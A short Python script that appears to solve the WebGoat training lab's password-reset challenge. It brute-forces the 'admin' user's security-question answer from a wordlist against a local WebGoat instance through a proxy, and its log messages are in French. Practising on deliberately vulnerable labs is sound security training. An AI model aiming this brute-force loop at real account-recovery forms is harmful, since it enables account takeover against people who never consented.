import requests
import logging

def run_script(url, cookies, proxy='127.0.0.1:8081'):
    wordlist='A2_Broken_Authentication/Password_reset/mywordlist.txt'
    proxies = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }
    headers = {
        "Cookie":cookies,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "http://127.0.0.1:8080",
        "Connection": "close",
        "Referer": "http://127.0.0.1:8080/WebGoat/start.mvc",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-PwnFox-Color": "red"
    }
    with open(wordlist) as f:
        for line in f:
            word = line.rstrip()
            data = {"username": "admin", "securityQuestion": word}
            response = requests.post(url, headers=headers, data=data, proxies=proxies)
            if "Congratulation" in response.text:
                logging.info(f"[*] Réponse de la question de sécurité pour l'utilisateur admin trouvée : {word}")
                logging.info('[*] Challenge Password reset validé')
                return word

    logging.info("Failed to find security question answer")
    return None
